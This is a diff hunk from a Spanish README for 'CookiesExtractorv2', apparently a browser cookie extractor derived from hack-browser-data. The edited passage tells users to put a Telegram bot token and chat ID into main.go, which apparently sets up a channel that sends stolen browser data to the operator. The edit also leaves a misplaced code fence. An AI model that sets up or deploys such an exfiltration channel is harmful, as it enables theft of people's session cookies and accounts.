@@ -79,7 +79,7 @@ $ git clone https://github.com/GrpDsG20/CookiesExtractorv2
 ```
 
 ### Configura tu bot de Telegram:
-Antes de compilar, necesitas editar el archivo main.go en la ruta cmd/hack-browser-data/main.go. Busca las líneas TelegramToken y ChatID y reemplaza los valores por tu propio token de bot de Telegram y el ID de tu chat.
+Antes de compilar, necesitas editar el archivo main.go en la ```bash ruta cmd/hack-browser-data/main.go. ``` Busca las líneas TelegramToken y ChatID y reemplaza los valores por tu propio token de bot de Telegram y el ID de tu chat.
 ```bash
 const (
     TelegramToken   = "TU_TOKEN_DE_BOT_AQUI" // Reemplaza esto con tu token real
